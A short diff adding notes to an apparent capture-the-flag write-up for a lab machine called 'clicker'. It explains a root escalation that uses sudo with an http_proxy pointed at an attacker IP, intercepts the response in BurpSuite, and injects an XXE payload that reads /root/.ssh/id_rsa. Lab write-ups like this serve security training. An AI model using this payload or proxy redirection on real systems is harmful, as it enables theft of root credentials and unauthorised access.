+   this uses a XXE to read the root's private key; the idea is to use the =http_proxy= env var,
+   set it to our local IP, and run the =monitor.sh= script. we'll intercept the request and
+   edit the response to read the root's private key.
+*** OFFICIAL SOLUTION
+    Since jack can change the environment of root before the execution of the script, we can
+    set the variable HTTP_PROXY to redirect the request to our machine. Then, we can change
+    the response of the server using BurpSuite and perform an XXE attack using the following
+    payload, which reads and displays the root user's private SSH key:
+    #+begin_src xml
+    <?xml version="1.0" encoding="ISO-8859-1"?>
+      <!DOCTYPE foo [  
+      <!ELEMENT foo ANY >
+      <!ENTITY xxe SYSTEM "/root/.ssh/id_rsa" >]>
+    <foo>&xxe;</foo>
+    #+end_src
+    NOTE: Before running the script, make sure that BurpSuite is configured to intercept
+    requests on all interfaces and not just on localhost. To do so, go to the Proxy tab, then
+    select settings , then Edit the current active proxy listener and select Bind to adress
+    option.
+    #+begin_src bash
+    jack@clicker:~$ sudo http_proxy=http://10.10.15.25:8080 /opt/monitor.sh
+    #+end_src
